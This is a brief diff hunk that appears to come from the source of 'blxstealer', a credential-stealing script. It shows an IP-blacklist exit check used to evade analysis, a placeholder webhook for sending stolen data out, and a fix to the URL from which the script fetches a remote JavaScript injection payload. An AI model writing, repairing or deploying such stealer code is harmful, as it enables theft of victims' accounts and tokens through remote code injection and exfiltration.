@@ -51,7 +51,7 @@ if ip in sblacklist:
     exit()
 
 h00k = "YOUR WEBHOOK HERE"
-inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/index.js"
+inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
 color = 0x8B0000
 DETECTED = False
 
